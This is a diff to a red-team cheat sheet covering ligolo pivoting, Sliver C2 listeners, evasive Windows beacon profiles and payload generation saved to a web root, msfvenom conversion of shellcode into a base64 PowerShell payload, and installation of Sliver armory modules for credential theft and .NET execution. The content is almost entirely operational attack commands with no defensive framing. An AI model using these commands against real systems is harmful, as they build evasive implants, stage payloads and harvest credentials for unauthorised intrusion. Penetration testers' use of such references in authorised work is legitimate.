@@ -2625,7 +2625,6 @@ session
 (select session)
 start
 sudo ip route add <subnet-here> dev ligolo
-
 ```
 
 ## Port Forwarding on Windows
@@ -2664,17 +2663,19 @@ Start Sliver Server:
 sudo systemctl start sliver
 ```
 
-Listeners
+### Listeners
 ```
 mtls -l <port>
 https
 ```
 
+### Profiles
 Generate Profile
 ```
 profiles new beacon --arch amd64 --os windows --mtls [ip:port] -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 RED_LAKE
 ```
 
+### Payloads
 Generate Beacons:
 ```
 generate beacon --evasion --arch amd64 --mtls [ip:port] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
@@ -2685,10 +2686,23 @@ Convert to Shellcode to PowerShell Payload (Unstable):
 msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --platform windows -e cmd/powershell_base64 -f ps1 -o safe.ps1
 ```
 
+### Armory
+Show armory
+```
+armory 
+```
 
-Start Listener
-```bash=
-mtls 
+Install stuffs
+```
+armory install all # not recommended
+
+armory install windows-credentials
+
+armory install .net-recon
+
+armory install .net-pivot
+
+armory install .net-execute
 ```
 
 ## Cobalt Strike
